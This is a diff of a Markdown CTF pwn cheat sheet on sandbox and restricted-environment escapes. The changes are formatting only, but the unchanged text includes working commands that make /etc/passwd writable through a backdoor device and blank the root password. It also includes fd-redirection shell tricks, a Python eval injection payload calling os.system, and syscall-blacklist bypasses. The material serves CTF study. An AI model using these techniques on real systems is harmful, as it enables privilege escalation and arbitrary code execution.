@@ -1,7 +1,6 @@
 # CTF Pwn - Sandbox Escape and Restricted Environments
 
 ## Table of Contents
-
 - [Python Sandbox Escape](#python-sandbox-escape)
 - [VM Exploitation (Custom Bytecode)](#vm-exploitation-custom-bytecode)
 - [FUSE/CUSE Character Device Exploitation](#fusecuse-character-device-exploitation)
@@ -15,7 +14,7 @@
 - [Unicorn Emulator Syscall Blacklist Bypass via sysenter and Uncommon Syscalls (Meepwn CTF Quals 2018)](#unicorn-emulator-syscall-blacklist-bypass-via-sysenter-and-uncommon-syscalls-meepwn-ctf-quals-2018)
 - [Custom VM swap Pointer Self-Overwrite (HITCON 2018)](#custom-vm-swap-pointer-self-overwrite-hitcon-2018)
 
-------
+---
 
 ## Python Sandbox Escape
 
@@ -26,12 +25,10 @@ Python jail/sandbox escape techniques (AST bypass, audit hook bypass, MRO-based 
 **Pattern (TerViMator, Pragyan 2026):** Custom VM with registers, opcodes, syscalls. Full RELRO + NX + PIE.
 
 **Common vulnerabilities in VM syscalls:**
-
 - **OOB read/write:** `inspect(obj, offset)` and `write_byte(obj, offset, val)` without bounds checking allows read/modify object struct data beyond allocated buffer
 - **Struct overflow via name:** `name(obj, length)` writing directly to object struct allows overflowing into adjacent struct fields
 
 **Exploitation pattern:**
-
 1. Allocate two objects (data + exec)
 2. Use OOB `inspect` to read exec object's XOR-encoded function pointer to leak PIE base
 3. Use `name` overflow to rewrite exec object's pointer with `win() ^ KEY`
@@ -44,13 +41,11 @@ Python jail/sandbox escape techniques (AST bypass, audit hook bypass, MRO-based 
 **Key insight:** FUSE/CUSE devices run handler code in userspace with the permissions of the device daemon. If the daemon runs as root and exposes a command interface via the write handler, any user who can write to the device file gains root-level operations (chmod, file read/write).
 
 **Identification:**
-
 - Look for `cuse_lowlevel_main()` or `fuse_main()` calls
 - Device operations struct with `open`, `read`, `write` handlers
 - Device name registered via `DEVNAME=backdoor` or similar
 
 **Common vulnerability patterns:**
-
 ```c
 // Backdoor pattern: write handler with command parsing
 void backdoor_write(const char *input, size_t len) {
@@ -64,7 +59,6 @@ void backdoor_write(const char *input, size_t len) {
 ```
 
 **Exploitation:**
-
 ```bash
 # Change /etc/passwd permissions via custom device
 echo "b4ckd00r:/etc/passwd:511" > /dev/backdoor
@@ -76,7 +70,6 @@ su root
 ```
 
 **Privilege escalation via passwd modification:**
-
 1. Make `/etc/passwd` writable via the backdoor
 2. Replace root line with `root::0:0:root:/root:/bin/sh` (no password)
 3. `su root` without password prompt
@@ -84,7 +77,6 @@ su root
 ## Busybox/Restricted Shell Escalation
 
 When in restricted environment without sudo:
-
 1. Find writable paths via character devices
 2. Target system files: `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`
 3. Modify permissions then content to gain root
@@ -94,7 +86,6 @@ When in restricted environment without sudo:
 ## Shell Tricks
 
 **File descriptor redirection (no reverse shell needed):**
-
 ```bash
 # Redirect stdin/stdout to client socket (fd 3 common for network)
 exec <&3; sh >&3 2>&3
@@ -102,25 +93,22 @@ exec <&3; sh >&3 2>&3
 # Or as single command string
 exec<&3;sh>&3
 ```
-
 - Network servers often have client connection on fd 3
 - Avoids firewall issues with outbound connections
 - Works when you have command exec but limited chars
 
 **Find correct fd:**
-
 ```bash
 ls -la /proc/self/fd           # List open file descriptors
 ```
 
 **Short shellcode alternatives:**
-
 - `sh<&3 >&3` - minimal shell redirect
 - Use `$0` instead of `sh` in some shells
 
 **Key insight:** Network servers typically have the client socket on fd 3. Redirecting stdin/stdout to this fd (`exec <&3; sh >&3 2>&3`) gives an interactive shell over the existing connection without needing outbound connectivity for a reverse shell.
 
-------
+---
 
 ## Write-Anywhere via /proc/self/mem (BSidesSF 2025)
 
@@ -150,7 +138,7 @@ write_mem(r, target_code_addr, shellcode)
 
 **Requirements:** File write primitive must handle binary data (null bytes). The target offset must be a valid mapped virtual address.
 
-------
+---
 
 ### process_vm_readv Failure as Sandbox Escape (0CTF 2016)
 
@@ -168,7 +156,7 @@ mmap(0x13370000, 0x1000, PROT_READ, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
 
 **References:** 0CTF 2016
 
-------
+---
 
 ### Named Pipe mkfifo for File Size Check Bypass (Nuit du Hack 2016)
 
@@ -188,14 +176,13 @@ Combine with symlinks for string reuse: `ln -s /flag arena.c` uses an existing s
 
 **References:** Nuit du Hack 2016
 
-------
+---
 
 ### Lua Integer Underflow via Game Logic (ASIS CTF Finals 2017)
 
 **Pattern:** Text-based game (written in Lua) with inventory management. Two independent percentage reductions are applied sequentially to the same value without capping the combined result: a 100% decay applied first zeros the inventory, then a 10% penalty applied to the already-zero value causes an integer underflow below zero. Selling the underflowed items generates unlimited money (the game treats a large negative count as a large positive sale value or wraps to unsigned max).
 
 **Vulnerable logic:**
-
 ```lua
 -- Applied sequentially, no combined-total check:
 inventory = inventory - math.floor(inventory * 0.10)  -- 10% penalty first
@@ -212,7 +199,6 @@ inventory = inventory - math.floor(inventory * 1.00)  -- 100% decay = zeroed
 ```
 
 **Exploitation:**
-
 ```python
 # 1. Identify the two independent reduction events in the game loop
 #    (e.g., end-of-round decay AND a transaction penalty)
@@ -227,14 +213,13 @@ inventory = inventory - math.floor(inventory * 1.00)  -- 100% decay = zeroed
 
 **References:** ASIS CTF Finals 2017
 
-------
+---
 
 ### CPU Emulator Print Opcode Python eval Injection (Midnight Sun CTF 2018)
 
 **Pattern:** Custom CPU emulator's print function uses `eval('"' + string_buffer + '"')` to process escape sequences in the output. Build a string in emulator memory character-by-character using ADD opcodes, then inject: `"+__import__("os").system("cmd")#` to escape the string literal and execute arbitrary Python.
 
 **Exploitation strategy:**
-
 1. The emulator implements a custom instruction set with ADD, MOV, PRINT, etc.
 2. The PRINT opcode reads a string from emulator memory and passes it to `eval('"' + s + '"')` to handle escape sequences like `\n`, `\t`
 3. Use ADD opcodes to build the injection string character-by-character in emulator memory
@@ -274,14 +259,13 @@ io.interactive()
 
 **References:** Midnight Sun CTF 2018
 
-------
+---
 
 ### Unicorn Emulator Syscall Blacklist Bypass via sysenter and Uncommon Syscalls (Meepwn CTF Quals 2018)
 
 **Pattern:** A Unicorn-based shellcode runner hooks `UC_HOOK_INSN` for `int 0x80` and `UC_HOOK_MEM_*` to block forbidden syscall numbers (execve, read, write, mmap). The filter only covers the `int 0x80` entry and the handful of syscalls the authors thought of.
 
 **Bypass:**
-
 1. Use `sysenter` instead of `int 0x80` — Unicorn's `INT` hook does not fire on the fast entry path.
 2. Use functionally equivalent syscalls that are not on the blacklist:
    - `dup3` instead of `dup2`
@@ -311,7 +295,7 @@ sysenter
 
 **References:** Meepwn CTF Quals 2018 — writeups 10415, 10428
 
-------
+---
 
 ## Custom VM swap Pointer Self-Overwrite (HITCON 2018)
 
